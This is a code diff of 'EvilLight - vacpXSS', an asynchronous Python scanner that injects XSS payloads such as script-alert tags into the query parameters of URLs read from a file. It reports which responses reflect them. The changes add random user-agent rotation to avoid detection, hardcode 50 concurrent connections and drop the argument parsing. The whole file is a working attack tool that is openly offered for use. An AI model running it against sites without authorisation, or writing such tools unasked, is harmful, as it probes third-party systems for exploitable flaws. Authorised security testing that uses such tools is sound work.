@@ -1,20 +1,15 @@
 import aiohttp
 import asyncio
 import urllib.parse
-import argparse
 from colorama import init, Fore
+from useragent.user_agent import _useragent_list
+import random
 
 init()
 
 rd = Fore.RED
 g = Fore.GREEN
 reset = Fore.RESET
-
-parse = argparse.ArgumentParser(description="EvilLight - vacpXSS")
-parse.add_argument('-f', help='File with URLs to scan')
-parse.add_argument('-o', default='xss_evillight.txt', help='Write found URLs to .txt')
-parse.add_argument('-c', default=50, type=int, help='Number of concurrent connections (default=50)')
-args = parse.parse_args()
 
 payloads = [
     "<script>alert('XSS')</script>",
@@ -25,10 +20,10 @@ payloads = [
 ]
 
 found_urls = []
-sem = asyncio.Semaphore(args.c)
-
+sem = asyncio.Semaphore(50)
 
 async def fetch(session, url, payload):
+    random_agent = random.choice(_useragent_list)
     url = url.strip()
     url_parsed = urllib.parse.urlparse(url)
     qs = urllib.parse.parse_qsl(url_parsed.query)
@@ -40,7 +35,7 @@ async def fetch(session, url, payload):
     new_query = urllib.parse.urlencode(injected_qs)
     full_url = urllib.parse.urlunparse(url_parsed._replace(query=new_query))
 
-    headers = {'User-Agent': "Mozilla/5.0"}
+    headers = {"User-Agent": random_agent}
 
     async with sem:
         try:
@@ -52,22 +47,20 @@ async def fetch(session, url, payload):
         except Exception:
             pass
 
-async def main():
-    with open(args.f, 'r') as f:
+async def main(file):
+    with open(file, 'r') as f:
         urls = f.readlines()
 
     async with aiohttp.ClientSession() as session:
         tasks = []
         for url in urls:
-            for payload in payloads:
-                tasks.append(fetch(session, url, payload))
+            if "=" in url:
+                for payload in payloads:
+                    tasks.append(fetch(session, url, payload))
         await asyncio.gather(*tasks)
 
     print(f"{g}\nScan complete. XSS Found: {len(found_urls)}{reset}")
-    with open(args.o, 'w') as f:
-        for url in found_urls:
-            f.write(url + "\n")
-
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    if found_urls:
+        with open('xss_evillight.txt', 'w') as f:
+            for url in found_urls:
+                f.write(url + "\n")
